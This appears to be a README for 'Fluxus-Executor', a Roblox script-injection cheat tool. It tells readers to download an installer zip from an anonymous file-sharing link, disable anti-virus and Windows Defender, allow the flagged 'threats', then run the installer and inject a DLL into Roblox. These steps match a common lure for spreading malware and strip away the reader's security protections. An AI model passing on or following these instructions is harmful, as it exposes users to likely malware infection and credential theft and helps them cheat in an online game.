# Fluxus-Executor

INSTRUCTIONS:

Go to https://easyupload.io/43iiw5 and download the installer zip

Disable anti-virus/Windows Defender because it will interfere with the installation and allow the "Threats" it detected (Fluxus is detected as a threat because it injects a .DLL file in order to work)

Install Fluxus by opening the "FluxusV7 Installer.exe" file and select a path

Once installed open the "Fluxus" folder on the path you selected for the installation

Open Fluxus.exe found in the "Fluxus" folder

Click the "inject" button to inject Fluxus into roblox while roblox is running

Put a script into the textbox and click "Execute"

Enjoy!
